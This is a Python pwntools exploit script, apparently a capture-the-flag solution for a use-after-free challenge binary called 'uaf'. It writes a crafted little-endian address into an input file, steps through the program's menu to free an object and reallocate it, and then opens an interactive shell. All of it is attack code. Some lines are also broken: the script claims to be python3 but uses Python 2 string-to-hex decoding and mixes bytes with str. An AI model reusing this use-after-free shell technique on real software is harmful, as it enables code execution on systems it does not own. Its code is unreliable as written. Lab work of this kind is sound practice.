from pwn import *
import sys

n = len(sys.argv)
if n < 2:
    print("[-] python3 exploit.py <dir>")
    quit(0)

if sys.argv[1][-1] == '/':
    input_path = sys.argv[1][:-1]
else:
    input_path = sys.argv[1]

path_to_executable = input_path + "/uaf"

print("[+] Start exploit!")

chunck_size = 24
give_shell_address = hex(0x401570 - 0x8)[2:]   # remove the '0x' prefix from the hex string
input_file_value = b"" + give_shell_address.decode('hex')[::-1] # convert bytes in little endian

with open("./input", "wb") as f:
    f.write(input_file_value)


p = process([path_to_executable, str(chunck_size), './input'])
print(p.recvuntil(b'free'))
print()
print("[+] Choosing option 3!")
p.sendline(b'3')
print(p.recvuntil(b'free'))
print()
print("[+] Choosing option 2!")
p.sendline(b'2')
print(p.recvuntil(b'free'))
print()
print("[+] Choosing option 2!")
p.sendline(b'2')
print(p.recvuntil(b'free'))
print()
print("[+] Choosing option 1!")
p.sendline(b'1')
print(p.recv())
p.interactive()
